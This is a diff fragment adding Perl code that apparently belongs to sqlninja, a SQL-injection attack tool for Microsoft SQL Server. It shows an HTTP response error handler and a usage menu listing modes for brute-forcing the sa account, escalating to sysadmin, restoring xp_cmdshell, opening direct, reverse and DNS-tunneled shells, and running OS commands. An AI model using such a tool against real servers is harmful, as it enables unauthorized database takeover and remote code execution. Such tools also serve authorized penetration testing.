+	    ($mode ne "b") and	# errors can be fine when bruteforcing
+	    ($mode ne "bruteforce")) {
+		$errorflag = 1;
+		print "[-] Warning... the server responded with ".$lines[0]
+			."\n";
+		print $errormsg;
+	}
+	# Second: check for custom error
+	if (($errorstring ne "") and # custom error has been defined 
+	    ($errorflag == 0) and    # no previous error detected
+	    ($mode ne "b") and		# errors can be fine when bruteforcing
+	    ($mode ne "bruteforce") and
+	    ($result =~ /$errorstring/)) { # error string found
+	    	$errorflag = 1;
+		print "[-] Warning... custom error page detected.\n";
+		print $errormsg;
+	}
+	close $s;
+	# DEBUG MODE 3
+	if (($debug eq "3") or ($debug eq "all")) {
+		print "++++++++++++++HTTP Response++++++++++++++++\n";
+		print $result;
+		print "-------------------------------------------\n";
+	}
+	return $result;
+}
+
+sub usage 
+{
+	die <<EOF;
+Usage: $0
+	-m <mode> : Required. Available modes are:
+	    t/test - test whether the injection is working
+	    f/fingerprint - fingerprint user, xp_cmdshell and more
+	    b/bruteforce - bruteforce sa account
+	    e/escalation - add user to sysadmin server role
+	    x/resurrectxp - try to recreate xp_cmdshell
+	    u/upload - upload a .scr file
+	    s/dirshell - start a direct shell
+	    k/backscan - look for an open outbound port
+	    r/revshell - start a reverse shell
+	    d/dnstunnel - attempt a dns tunneled shell
+	    c/sqlcmd - issue a 'blind' OS command
+	    m/metasploit - wrapper to Metasploit stagers
+	-f <file> : configuration file (default: sqlninja.conf)
+	-p <password> : sa password
+	-w <wordlist> : wordlist to use in bruteforce mode (dictionary method
+	                only)
+	-g : generate debug script and exit (only valid in upload mode)
+	-v : verbose output
+	-d <mode> : activate debug
+	    1 - print each injected command
+	    2 - print each raw HTTP request
+	    3 - print each raw HTTP response
+	    all - all of the above
+	...see sqlninja-howto.html for details
+	 
+EOF
+}
+
